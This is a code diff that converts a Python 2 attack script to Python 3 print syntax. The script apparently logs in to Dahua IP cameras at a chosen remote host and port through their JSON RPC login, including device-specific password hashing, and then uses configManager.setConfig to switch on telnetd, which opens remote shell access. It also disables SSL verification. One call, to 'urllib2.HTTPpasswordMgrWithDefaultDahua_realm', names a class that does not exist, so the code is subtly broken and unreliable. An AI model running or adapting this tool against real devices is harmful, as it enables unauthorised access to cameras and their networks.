@@ -9,6 +9,7 @@
 # (I know Dahua has been killing telnetd hard, deleted telnetd... and done lots of stupid stuff)
 #
 
+from __future__ import print_function
 import sys
 import socket
 import urllib, urllib2, httplib
@@ -86,17 +87,17 @@ class HTTPconnect:
 		url = '{}://{}{}'.format(self.proto, self.host, self.uri)
 
 		if self.verbose:
-			print "[Verbose] Sending:", url
+			print("[Verbose] Sending:", url)
 
 		if self.proto == 'https':
 			if hasattr(ssl, '_create_unverified_context'):
-				print "[i] Creating SSL Unverified Context"
+				print("[i] Creating SSL Unverified Context")
 				ssl._create_default_https_context = ssl._create_unverified_context
 
 		if self.credentials:
 			Basic_Auth = self.credentials.split(':')
 			if self.verbose:
-				print "[Verbose] User:",Basic_Auth[0],"password:",Basic_Auth[1]
+				print("[Verbose] User:",Basic_Auth[0],"password:",Basic_Auth[1])
 			try:
 				pwd_mgr = urllib2.HTTPpasswordMgrWithDefaultDahua_realm()
 				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
@@ -104,11 +105,11 @@ class HTTPconnect:
 				opener = urllib2.build_opener(auth_handler)
 				urllib2.install_opener(opener)
 			except Exception as e:
-				print "[!] Basic Auth Error:",e
+				print("[!] Basic Auth Error:",e)
 				sys.exit(1)
 
 		if self.noexploit and not self.verbose:
-			print "[<] 204 Not Sending!"
+			print("[<] 204 Not Sending!")
 			html =  "Not sending any data"
 			return html
 		else:
@@ -124,7 +125,7 @@ class HTTPconnect:
 					req.add_header('Cookie', Cookie)
 			rsp = urllib2.urlopen(req)
 			if rsp:
-				print "[<] {} OK".format(rsp.code)
+				print("[<] {} OK".format(rsp.code))
 
 		if self.Raw:
 			return rsp
@@ -155,7 +156,7 @@ class Dahua_Functions:
 		elif self.cmd == 'disable':
 			self.cmd = False
 		else:
-			print "[!] Telnetd: Invalid CMD ({})".format(self.cmd)
+			print("[!] Telnetd: Invalid CMD ({})".format(self.cmd))
 			return self.cmd
 
 		query_args = {"method":"configManager.setConfig",
@@ -168,27 +169,27 @@ class Dahua_Functions:
 			"session":self.SessionID,
 			"id":1}
 
-		print "[>] Enable telnetd: {}".format(self.cmd)
+		print("[>] Enable telnetd: {}".format(self.cmd))
 		result = json.load(self.JsonSendRequest(query_args))
 		if not result['result']:
-			print "Resp: ",result
-			print "Error CMD: {}".format(self.string_request)
+			print("Resp: ",result)
+			print("Error CMD: {}".format(self.string_request))
 			return
-		print result
+		print(result)
 
 	def logout(self):
 
-		print "[i] Logging out"
+		print("[i] Logging out")
 		query_args = {"method":"global.logout",
 			"params":"null",
 			"session":self.SessionID,
 			"id":10001}
 		result = json.load(self.JsonSendRequest(query_args))
 		if not result['result']:
-			print result
+			print(result)
 			return
 		elif result['result']:
-			print result
+			print(result)
 		return result
 
 	def JsonSendRequest(self,query_args):
@@ -289,10 +290,10 @@ if __name__ == '__main__':
 		arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
 		args = arg_parser.parse_args()
 	except Exception as e:
-		print INFO,"\nError: {}\n".format(str(e))
+		print(INFO,"\nError: {}\n".format(str(e)))
 		sys.exit(1)
 
-	print "\n[*]",INFO
+	print("\n[*]",INFO)
 
 	if args.verbose:
 		verbose = args.verbose
@@ -328,13 +329,13 @@ if __name__ == '__main__':
 
 	# Check if RPORT is valid
 	if not Validate(verbose).Port(rport):
-		print "[!] Invalid RPORT - Choose between 1 and 65535"
+		print("[!] Invalid RPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(verbose).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 
@@ -342,9 +343,9 @@ if __name__ == '__main__':
 # Validation done, start print out stuff to the user
 #
 	if args.https:
-		print "[i] HTTPS / SSL Mode Selected"
-	print "[i] Remote target IP:",rhost
-	print "[i] Remote target PORT:",rport
+		print("[i] HTTPS / SSL Mode Selected")
+	print("[i] Remote target IP:",rhost)
+	print("[i] Remote target PORT:",rport)
 
 	rhost = rhost + ':' + rport
 
@@ -363,7 +364,7 @@ if __name__ == '__main__':
 		#
 		# Request SessionID
 		#
-		print "[>] Requesting session ID"
+		print("[>] Requesting session ID")
 		query_args = {"method":"global.login",
 			"params":{
 				"userName":username,
@@ -375,7 +376,7 @@ if __name__ == '__main__':
 		response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,query_args,None)
 		Dahua_json = json.load(response)
 		if verbose:
-			print json.dumps(Dahua_json,sort_keys=True,indent=4, separators=(',', ': '))
+			print(json.dumps(Dahua_json,sort_keys=True,indent=4, separators=(',', ': ')))
 
 		SessionID = Dahua_json['session']
 
@@ -384,10 +385,10 @@ if __name__ == '__main__':
 		#
 
 		if Dahua_json['params']['encryption'] == 'Default':
-			print "[i] Detected generation 3 encryption"
+			print("[i] Detected generation 3 encryption")
 
 			RANDOM_HASH = dahua_md5_hash(Dahua_json['params']['random'],Dahua_json['params']['realm'], username, password)
-			print "[>] Logging in"
+			print("[>] Logging in")
 
 			query_args = {"method":"global.login",
 				"session":SessionID,
@@ -402,11 +403,11 @@ if __name__ == '__main__':
 			response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,query_args,SessionID)
 			Dahua_json = json.load(response)
 			if verbose:
-				print Dahua_json
+				print(Dahua_json)
 			if Dahua_json['result'] == True:
-				print "[<] Login OK"
+				print("[<] Login OK")
 			elif Dahua_json['result'] == False:
-				print "[<] Login failed: {} ({})".format(Dahua_json['error']['message'],Dahua_json['params']['error'])
+				print("[<] Login failed: {} ({})".format(Dahua_json['error']['message'],Dahua_json['params']['error']))
 				sys.exit(1)
 
 		#
@@ -414,11 +415,11 @@ if __name__ == '__main__':
 		#
 
 		elif Dahua_json['params']['encryption'] == 'OldDigest':
-			print "[i] Detected generation 2 encryption"
+			print("[i] Detected generation 2 encryption")
 
 			HASH = sofia_hash(password)
 
-			print "[>] Logging in"
+			print("[>] Logging in")
 
 			query_args = {"method":"global.login",
 				"session":SessionID,
@@ -433,22 +434,22 @@ if __name__ == '__main__':
 			response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,query_args,SessionID)
 			Dahua_json = json.load(response)
 			if verbose:
-				print Dahua_json
+				print(Dahua_json)
 
 			if Dahua_json['result'] == True:
-				print "[<] Login OK"
+				print("[<] Login OK")
 			elif Dahua_json['result'] == False:
-				print "[<] Login failed: {}".format(Dahua_json['error']['message'])
+				print("[<] Login failed: {}".format(Dahua_json['error']['message']))
 				sys.exit(1)
 
 		elif Dahua_json['params']['encryption'] == 'Basic':
-			print "LDAP / AD not supported"
+			print("LDAP / AD not supported")
 			sys.exit(1)
 		elif Dahua_json['params']['encryption'] == 'WatchNet':
-			print "Watchnet not supported"
+			print("Watchnet not supported")
 			sys.exit(1)
 		else:
-			print "Unknown encryption {}".format(Dahua_json['params']['encryption'])
+			print("Unknown encryption {}".format(Dahua_json['params']['encryption']))
 			sys.exit(1)
 
 		# Enable / Disable Telnetd
@@ -457,14 +458,14 @@ if __name__ == '__main__':
 		responce = Dahua_Functions(rhost,proto,verbose,credentials,raw_request,headers,username,SessionID).logout()
 
 	except Exception as e:
-		print "[!] What happen? ({})".format(e)
+		print("[!] What happen? ({})".format(e))
 		try:
 			# Something screwed up, try to logout
 			Dahua_Functions(rhost,proto,verbose,credentials,raw_request,headers,username,SessionID).logout()
 			sys.exit(1)
 		except Exception as e:
 			# Not even logout working... wtf?
-			print "[!] What happen again? ({})".format(e)
+			print("[!] What happen again? ({})".format(e))
 			sys.exit(1)
 
 
